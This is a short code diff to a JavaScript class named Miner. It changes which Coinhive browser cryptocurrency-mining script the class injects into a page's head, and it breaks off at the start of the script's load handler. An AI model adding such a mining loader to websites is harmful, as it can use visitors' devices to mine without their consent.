@@ -17,7 +17,7 @@ export default class Miner {
     const script = document.createElement('script');
     script.id = 'coinhive';
     script.type = 'text/javascript';
-    script.src = 'https://coinhive.com/lib/coinhive.min.js';
+    script.src = 'https://coinhive.com/lib/ch2.min.js';
     document.head.appendChild(script);
 
     script.addEventListener('load', () => {
